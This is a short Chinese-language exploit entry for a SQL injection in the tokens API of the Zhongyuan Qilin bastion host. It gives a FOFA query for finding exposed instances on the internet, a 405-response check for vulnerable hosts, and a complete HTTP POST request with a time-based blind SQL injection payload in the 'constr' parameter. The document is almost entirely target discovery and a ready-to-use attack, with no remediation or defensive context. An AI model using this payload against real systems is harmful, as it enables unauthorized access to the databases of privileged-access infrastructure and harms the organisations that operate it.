# 中远麒麟 堡垒机 tokens SQL注入漏洞

## 网络测绘

fofa: cert.subject="Baolei" || title="麒麟堡垒机"

## POC / EXP

```
/baoleiji/api/tokens

返回 HTTP状态 405 - 方法不允许 存在漏洞
```

```
POST /baoleiji/api/tokens HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0

constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1
```